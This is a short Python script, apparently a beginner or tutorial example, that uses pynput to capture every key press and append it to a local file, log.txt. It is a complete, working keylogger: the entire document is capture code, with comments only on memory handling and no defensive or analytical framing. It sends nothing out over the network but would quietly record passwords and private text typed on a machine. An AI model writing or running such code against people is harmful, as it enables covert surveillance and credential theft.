from pynput.keyboard import Listener
def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'", "")
    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.shift_r':
        letter = ''
    if letter == "Key.ctrl_l":
        letter = ""
    if letter == "Key.enter":
        letter = "\n"
    with open("log.txt", 'a') as f:
        f.write(letter)
# Collecting events until stopped
with Listener(on_press=write_to_file) as l:
    l.join()
# 'with' will automatically close the listener. When we stop the program the memory allocated
# to this listener won't be released. 'with' makes sure whatever happens, when an error is there
# or the program stops the memory is released. It's just a good coding principle to follow